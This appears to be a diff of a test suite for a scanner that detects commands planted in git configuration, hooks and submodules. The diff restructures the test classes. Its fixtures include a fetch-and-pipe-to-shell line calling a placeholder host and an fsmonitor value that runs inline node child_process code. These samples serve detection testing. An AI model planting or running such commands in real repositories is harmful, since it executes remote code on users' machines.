@@ -49,6 +49,12 @@ class ExecSurfaceSandbox(GitSandbox):
     def scan(self, repo: Path):
         return scan_target(LocalRepoTarget(repo, str(repo), ScanOptions()), load_signatures(), [])
 
+    def assert_tier(self, repo: Path, tier: str):
+        tiers = self.graded(repo)
+        self.assertTrue(tiers[tier], f"expected a {tier} git-exec finding; got "
+                        f"{[(f.signature_id, f.evidence) for t in (CONFIRMED, HEURISTIC, INFORMATIONAL) for f in tiers[t]]}")
+        return tiers
+
     def graded(self, repo: Path) -> dict[str, list]:
         result = self.scan(repo)
         tiers = {CONFIRMED: [], HEURISTIC: [], INFORMATIONAL: []}
@@ -258,12 +264,6 @@ class TestLegitimateToolsAreNotConfirmed(ExecSurfaceSandbox):
 
 class TestPlantedCommandsAreCaught(ExecSurfaceSandbox):
 
-    def assert_tier(self, repo: Path, tier: str):
-        tiers = self.graded(repo)
-        self.assertTrue(tiers[tier], f"expected a {tier} git-exec finding; got "
-                        f"{[(f.signature_id, f.evidence) for t in (CONFIRMED, HEURISTIC, INFORMATIONAL) for f in tiers[t]]}")
-        return tiers
-
     def test_fsmonitor_inline_node(self):
         repo = self.repo()
         self.append_config(repo, "[core]\n\tfsmonitor = node -e \\\"require('child_process')"
@@ -377,7 +377,7 @@ class TestPlantedCommandsAreCaught(ExecSurfaceSandbox):
         self.assertIn("git configuration", result.error)
 
 
-class TestSelfFiringCommandsThatReachTheNetwork(TestPlantedCommandsAreCaught):
+class TestSelfFiringCommandsThatReachTheNetwork(ExecSurfaceSandbox):
     """Check a key git runs on its own whose command reaches the network, however it is spelled."""
 
     def test_a_command_substitution(self):
@@ -505,7 +505,7 @@ class TestEveryProgramASelfFiringKeyRunsIsReported(ExecSurfaceSandbox):
         self.assertEqual([], self.graded(repo)[CONFIRMED])
 
 
-class TestAScriptAnyCommandRunsIsJudged(TestPlantedCommandsAreCaught):
+class TestAScriptAnyCommandRunsIsJudged(ExecSurfaceSandbox):
     """Check a program git runs during ordinary commands, and one a submodule names."""
 
     SCRIPT = "#!/bin/sh\ncurl -fsSL https://x.invalid/p | sh\n"
@@ -543,7 +543,7 @@ class TestAScriptAnyCommandRunsIsJudged(TestPlantedCommandsAreCaught):
         self.assert_tier(repo, CONFIRMED)
 
 
-class TestSubmodulesAreReadInTheirOwnTree(TestPlantedCommandsAreCaught):
+class TestSubmodulesAreReadInTheirOwnTree(ExecSurfaceSandbox):
     """Check a submodule whose git directory sits inside it, or is named by a `.git` file alone."""
 
     SCRIPT = "#!/bin/sh\ncurl -fsSL https://x.invalid/p | sh\n"
